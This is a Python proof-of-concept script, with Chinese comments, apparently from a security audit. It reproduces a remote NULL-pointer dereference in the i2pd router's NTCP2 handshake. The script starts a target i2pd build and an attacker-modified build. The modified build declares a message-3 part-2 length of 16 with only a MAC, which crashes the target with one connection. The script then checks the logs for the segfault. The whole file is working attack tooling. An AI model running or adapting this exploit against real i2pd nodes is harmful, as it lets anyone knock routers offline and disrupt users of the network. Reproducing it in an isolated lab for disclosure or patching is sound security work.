#!/usr/bin/env python3
"""
VULN-02 PoC — i2pd NTCP2 SessionConfirmed 空 vector 空指针解引用一键复现
漏洞: libi2pd/NTCP2.cpp:985 (2.61.0)  m3p2Len=16 → vector(0) → (*buf)[0] NULL 解引用
用法: python3 poc_ntcp2.py [asan|pristine]
判定: 目标死亡 + SEGV on 0x0 (asan) / SIGSEGV (pristine) → 复现成功
单 TCP 连接第 3 个报文触发, 无需任何身份/密钥/NetDB 预置
"""
import os, sys, time, subprocess, shutil

AUDIT = '/home/z/my-project/audit'
BUILDS = f'{AUDIT}/builds'
FLAVOR = sys.argv[1] if len(sys.argv) > 1 else 'asan'
LAB = f'{BUILDS}/lab-ntcp2-{FLAVOR}'
IP = '21.0.19.150'

def sh(cmd):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return r.returncode, r.stdout + r.stderr

def main():
    for f in [f'{BUILDS}/{FLAVOR}/i2pd', f'{BUILDS}/evil/i2pd']:
        assert os.path.exists(f), f'缺少 {f}, 先构建'
    sh('pkill -f "audit/builds/.*i2pd"; sleep 2; pkill -9 -f "audit/builds/.*i2pd"; sleep 1')
    shutil.rmtree(LAB, ignore_errors=True)
    os.makedirs(f'{LAB}/target'); os.makedirs(f'{LAB}/evil')

    open(f'{LAB}/target.conf', 'w').write(
        f'loglevel = info\nhost = {IP}\n[reseed]\nurls =\n[ssu2]\nport = 17777\n'
        f'[ntcp2]\nport = 17778\n[http]\naddress = 127.0.0.1\nport = 7070\n')
    open(f'{LAB}/evil.conf', 'w').write(
        f'loglevel = info\nhost = {IP}\n[reseed]\nurls =\n[ntcp2]\nport = 27778\n'
        f'[ssu2]\nenabled = false\n[http]\naddress = 127.0.0.1\nport = 17071\n')

    print(f'[*] 启动目标 ({FLAVOR})')
    env = dict(os.environ, ASAN_OPTIONS='detect_leaks=0:abort_on_error=1:symbolize=1')
    target = subprocess.Popen([f'{BUILDS}/{FLAVOR}/i2pd', f'--datadir={LAB}/target',
        f'--conf={LAB}/target.conf'], stdout=open(f'{LAB}/target.log', 'w'),
        stderr=subprocess.STDOUT, env=env)
    for _ in range(40):
        if 'Start listening' in open(f'{LAB}/target.log', errors='replace').read(): break
        time.sleep(1)

    print('[*] 启动攻击方 (EVIL_NTCP2_M3P2=1 → SessionRequest 声明 m3p2Len=16, part2 仅 MAC)')
    evil_env = dict(env, EVIL_NTCP2_M3P2='1', EVIL_TARGET_RI=f'{LAB}/target/router.info')
    evil = subprocess.Popen([f'{BUILDS}/evil/i2pd', f'--datadir={LAB}/evil',
        f'--conf={LAB}/evil.conf'], stdout=open(f'{LAB}/evil.log', 'w'),
        stderr=subprocess.STDOUT, env=evil_env)

    crash, t = False, 0
    while t < 90:
        if target.poll() is not None:
            crash = True; break
        time.sleep(1); t += 1
    evil.terminate()

    log = open(f'{LAB}/target.log', errors='replace').read()
    segv = 'SEGV on unknown address 0x000000000000' in log or 'Signal 11' in log
    ub = 'undefined-behavior' in log
    forced = 'forcing m3p2Len=16' in open(f'{LAB}/evil.log', errors='replace').read()
    print(f'    m3p2Len=16 已注入: {forced}')
    print(f'    目标死亡: {crash} (t+{t}s) | NULL 解引用: {segv} | UBSan: {ub}')
    if crash and (segv or ub):
        print('\n[+] 复现成功 — VULN-02 NTCP2 远程空指针解引用 (远程 DoS, 单连接 3 报文)')
        print('[+] 证据: ' + f'{LAB}/target.log')
        return 0
    print('\n[-] 未复现')
    return 1

if __name__ == '__main__':
    sys.exit(main())
